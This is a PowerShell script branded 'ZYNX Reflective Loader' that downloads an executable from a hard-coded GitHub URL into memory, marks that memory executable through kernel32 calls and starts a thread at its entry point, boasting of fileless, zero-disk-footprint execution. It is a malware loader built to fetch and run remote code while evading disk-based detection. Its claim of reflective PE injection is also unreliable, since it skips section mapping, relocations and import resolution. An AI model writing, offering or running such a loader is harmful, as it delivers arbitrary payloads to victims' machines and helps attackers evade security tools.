# ZYNX Reflective Loader - Pure Memory Execution
# ใช้ Reflective PE Injection - 100% Fileless

param(
    [string]$Url = "https://raw.githubusercontent.com/kanokponjamsiri-pixel/LOADERRRRR/refs/heads/main/Loader.exe"
)

function Write-ColorBanner {
    Write-Host @"

    ███████╗██╗   ██╗███╗   ██╗██╗  ██╗
    ╚══███╔╝╚██╗ ██╔╝████╗  ██║╚██╗██╔╝
      ███╔╝  ╚████╔╝ ██╔██╗ ██║ ╚███╔╝ 
     ███╔╝    ╚██╔╝  ██║╚██╗██║ ██╔██╗ 
    ███████╗   ██║   ██║ ╚████║██╔╝ ██╗
    ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝

"@ -ForegroundColor Magenta
}

function Invoke-ReflectivePEInjection {
    param([byte[]]$PEBytes)
    
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Native {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    
    # Constants
    $MEM_COMMIT = 0x1000
    $MEM_RESERVE = 0x2000
    $PAGE_EXECUTE_READWRITE = 0x40
    $PAGE_READWRITE = 0x04
    
    # Allocate memory for PE
    Write-Host "[+] Allocating memory for PE ($($PEBytes.Length) bytes)..." -ForegroundColor Yellow
    $addr = [Native]::VirtualAlloc([IntPtr]::Zero, $PEBytes.Length, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_READWRITE)
    
    if ($addr -eq [IntPtr]::Zero) {
        throw "Failed to allocate memory"
    }
    
    Write-Host "[✓] Memory allocated at: 0x$($addr.ToString('X16'))" -ForegroundColor Green
    
    # Copy PE to memory
    Write-Host "[+] Copying PE to memory..." -ForegroundColor Yellow
    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $addr, $PEBytes.Length)
    
    # Parse PE headers
    $dosHeader = [System.Runtime.InteropServices.Marshal]::ReadInt16($addr)
    if ($dosHeader -ne 0x5A4D) {  # "MZ"
        throw "Invalid PE file (bad DOS signature)"
    }
    
    $peOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($addr, 0x3C))
    $peSignature = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($addr, $peOffset))
    
    if ($peSignature -ne 0x00004550) {  # "PE\0\0"
        throw "Invalid PE file (bad PE signature)"
    }
    
    Write-Host "[✓] PE headers validated" -ForegroundColor Green
    
    # Get entry point
    $entryPointRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($addr, $peOffset + 0x28))
    $entryPoint = [IntPtr]::Add($addr, $entryPointRVA)
    
    Write-Host "[✓] Entry point RVA: 0x$($entryPointRVA.ToString('X'))" -ForegroundColor Green
    Write-Host "[✓] Entry point address: 0x$($entryPoint.ToString('X16'))" -ForegroundColor Green
    
    # Change memory protection to executable
    Write-Host "[+] Setting memory as executable..." -ForegroundColor Yellow
    $oldProtect = 0
    $result = [Native]::VirtualProtect($addr, $PEBytes.Length, $PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
    
    if (-not $result) {
        throw "Failed to change memory protection"
    }
    
    Write-Host "[✓] Memory is now executable" -ForegroundColor Green
    
    # Create thread at entry point
    Write-Host "[+] Creating execution thread..." -ForegroundColor Yellow
    $threadHandle = [Native]::CreateThread([IntPtr]::Zero, 0, $entryPoint, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    
    if ($threadHandle -eq [IntPtr]::Zero) {
        throw "Failed to create thread"
    }
    
    Write-Host "[✓] Thread created successfully (Handle: 0x$($threadHandle.ToString('X')))" -ForegroundColor Green
    Write-Host "[+] Waiting for execution..." -ForegroundColor Cyan
    
    # Wait for thread to complete (5 seconds timeout)
    [Native]::WaitForSingleObject($threadHandle, 5000) | Out-Null
    
    Write-Host "[✓] Execution completed!" -ForegroundColor Green
}

# Main execution
try {
    Write-ColorBanner
    Write-Host "    [★] ZYNX REFLECTIVE LOADER [★]" -ForegroundColor DarkMagenta
    Write-Host "    [★] 100% FILELESS EXECUTION [★]" -ForegroundColor Cyan
    Write-Host ""
    
    # Set TLS
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
    
    Write-Host "[+] Downloading PE from: $Url" -ForegroundColor Yellow
    
    # Download to memory only
    $webClient = New-Object System.Net.WebClient
    $peBytes = $webClient.DownloadData($Url)
    
    Write-Host "[✓] Downloaded $($peBytes.Length) bytes to memory" -ForegroundColor Green
    Write-Host "[!] No files written to disk!" -ForegroundColor Cyan
    Write-Host ""
    
    # Execute from memory
    Invoke-ReflectivePEInjection -PEBytes $peBytes
    
    Write-Host ""
    Write-Host "[★] All operations completed in memory!" -ForegroundColor Green
    Write-Host "[★] Zero disk footprint!" -ForegroundColor Cyan
    
} catch {
    Write-Host ""
    Write-Host "[-] ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Details: $($_.Exception.StackTrace)" -ForegroundColor DarkRed
}
